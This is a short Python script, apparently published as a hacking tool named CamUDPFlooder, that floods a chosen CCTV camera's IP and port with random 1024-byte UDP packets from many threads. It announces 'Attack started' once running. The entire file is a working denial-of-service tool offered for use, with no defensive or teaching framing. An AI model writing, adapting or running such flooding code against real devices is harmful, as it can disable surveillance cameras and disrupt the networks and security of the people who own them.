# CamUDPFlooder
# A tool which send random UDP packets to CCTV cameras.
# Author - WireBits

import time
import socket
import random
import argparse
import threading

terminate_flag = threading.Event()

def send_random_udp_packets(target_ip, target_port):
    while not terminate_flag.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            random_data = bytes(random.getrandbits(8) for _ in range(1024))
            sock.sendto(random_data, (target_ip, target_port))
            time.sleep(0.01)
        except socket.error as e:
            if e.errno == 10051:
                print("[!]Network unreachable. Check your target IP and network settings!")
                terminate_flag.set()
            else:
                print(f"An error occurred: {e}")
        finally:
            sock.close()

def multiple_threads(ip, port, total_threads):
    threads = []
    for _ in range(total_threads):
        thread = threading.Thread(target=send_random_udp_packets, args=(ip, port))
        thread.daemon = True
        threads.append(thread)
        thread.start()

    print(f"[*]Attack started on {ip}:{port} with {total_threads} threads!")
    print("[*]Press Ctrl + C to terminate the program!")
    try:
        while not terminate_flag.is_set():
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nTerminating program...")
        terminate_flag.set()

    for thread in threads:
        thread.join()

def main_jam():
    parser = argparse.ArgumentParser(description='CamUDPFlooder')
    parser.add_argument('-ip', '--ip', type=str, required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, required=True, help='Target port number')
    parser.add_argument('-t', '--threads', type=int, required=True, help='Number of threads')
    
    args = parser.parse_args()
    ip = args.ip
    port = args.port
    total_threads = args.threads
    multiple_threads(ip, port, total_threads)

if __name__ == "__main__":
    main_jam()